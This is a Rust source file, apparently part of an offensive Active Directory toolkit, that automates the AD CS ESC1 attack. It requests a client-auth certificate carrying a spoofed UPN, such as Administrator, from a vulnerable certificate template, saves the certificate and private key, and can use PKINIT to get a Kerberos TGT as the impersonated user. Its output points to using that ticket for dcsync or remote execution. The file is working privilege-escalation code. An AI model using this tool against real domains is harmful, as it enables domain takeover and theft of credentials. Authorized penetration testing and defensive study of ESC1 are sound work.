//! AD CS ESC1: enroll a client-auth certificate with a spoofed UPN SAN on an
//! enrollee-supplies-subject template, then optionally PKINIT to obtain a TGT
//! as the impersonated principal.

use anyhow::Result;
use clap::Parser;

#[derive(Parser)]
pub(crate) struct Esc1Args {
    #[command(flatten)]
    pub auth: crate::shared_args::SmbAuth,
    /// CA name, e.g. corp-CA
    #[arg(long)]
    pub ca: String,
    /// Vulnerable template name (enrollee-supplies-subject), e.g. VulnUser
    #[arg(long)]
    pub template: String,
    /// UPN to impersonate via the SAN, e.g. Administrator@corp.local
    #[arg(long)]
    pub upn: String,
    /// Output path for the issued cert (DER); the private key is written alongside as .key.pem
    #[arg(long, default_value = "esc1.crt")]
    pub out: String,
    /// After issuing, PKINIT with the cert to obtain a TGT as the impersonated user (→ .ccache)
    #[arg(long)]
    pub pkinit: bool,
    /// KDC `host[:port]` for --pkinit (defaults to --host)
    #[arg(long)]
    pub kdc: Option<String>,
}

/// AD CS ESC1: build a PKCS#10 CSR whose SAN is the target UPN, enroll it on an
/// enrollee-supplies-subject template via MS-ICPR, and save the issued client-auth cert + key.
/// The cert can then PKINIT as the impersonated principal.
pub(crate) async fn esc1(a: Esc1Args) -> Result<()> {
    use smb2_client::SmbClient;

    let subject = a.upn.split('@').next().unwrap_or("adhammer");
    let csr = adhammer_kerberos::csr::build_csr(subject, Some(&a.upn))?;
    eprintln!("[*] CSR built (subject CN={subject}, SAN upn={})", a.upn);

    let mut smb = SmbClient::connect(&a.auth.host).await?;
    smb.login(&a.auth.host, &a.auth.domain, &a.auth.user, &a.auth.password)
        .await?;
    smb.tree_connect(&format!("\\\\{}\\IPC$", a.auth.host))
        .await?;

    let r = dcerpc::icpr::request_cert(
        &mut smb,
        &a.ca,
        &a.template,
        &csr.der,
        &a.auth.domain,
        &a.auth.user,
        &a.auth.password,
        &a.auth.host,
    )
    .await?;

    // Disposition: 3 = ISSUED, 5 = UNDER SUBMISSION (pending).
    if r.disposition == 3 && !r.cert_der.is_empty() {
        std::fs::write(&a.out, &r.cert_der)?;
        let key_path = format!("{}.key.pem", a.out);
        std::fs::write(&key_path, &csr.key_pem)?;
        println!(
            "[+] ESC1: certificate ISSUED for UPN {} → {} ({} bytes), key → {}",
            a.upn,
            a.out,
            r.cert_der.len(),
            key_path
        );

        if a.pkinit {
            let kdc = a.kdc.clone().unwrap_or_else(|| a.auth.host.clone());
            let realm = a
                .upn
                .split('@')
                .nth(1)
                .unwrap_or(&a.auth.domain)
                .to_string();
            match adhammer_kerberos::pkinit::pkinit_with_cert(
                subject,
                &realm,
                &kdc,
                &csr.key_pem,
                Some(&r.cert_der),
            )
            .await
            {
                Ok(tgt) => {
                    let ccache = format!("{subject}.ccache");
                    std::fs::write(&ccache, &tgt.ccache)?;
                    println!("[+] PKINIT OK — TGT obtained as {subject}; ccache → {ccache}");
                    println!(
                        "    KRB5CCNAME={ccache} → use for Kerberos auth (dcsync, exec via -k, …)"
                    );
                }
                Err(e) => {
                    println!("[-] PKINIT with the issued cert failed: {e:#}");
                    if e.to_string().contains("error 66") {
                        println!("    (KDC_ERR_CANT_VERIFY_CERTIFICATE — likely strong certificate-mapping");
                        println!("     enforcement (KB5014754): a UPN-only cert has no SID mapping to the");
                        println!("     target, so the KDC refuses it. ESC1 escalation is mitigated on this DC.");
                        println!("     The cert was still issued — the template is vulnerable.)");
                    }
                }
            }
        } else {
            println!(
                "    next: --pkinit to turn this cert into a TGT as {}",
                subject
            );
        }
    } else {
        println!(
            "[-] enrollment not issued (disposition {}): {}",
            r.disposition, r.message
        );
    }
    Ok(())
}
